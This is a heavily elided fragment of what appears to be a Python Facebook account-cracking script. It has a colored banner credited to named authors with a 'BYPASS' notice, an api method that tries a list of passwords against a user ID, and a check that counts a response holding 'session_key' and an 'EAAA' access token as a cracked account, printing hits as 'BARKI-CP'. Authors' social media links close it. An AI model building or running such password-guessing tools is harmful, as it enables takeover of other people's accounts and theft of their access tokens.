...
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : NAZIR KHAN765
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mWARNING  : BYPASS BY ISRAR
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;91m   [BARKI-CP] %s | %s\033[0;97m         "%(uid, pw))
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		...
		print(" [*] Team      :  \n")
		print(" [ Sosial Medi  ] \n")
		print(" [*] Facebook  :  https://www.facebook.com/Barkikhan6")
		print(" [*] Instagram : https://instagram.com/barki68")
		print(" [*] YouTube   : https://youtube.com/MR-BARKI")
		exit(" [*] GitHub    : https://github.com/BARKI98")
	else:
		Main()
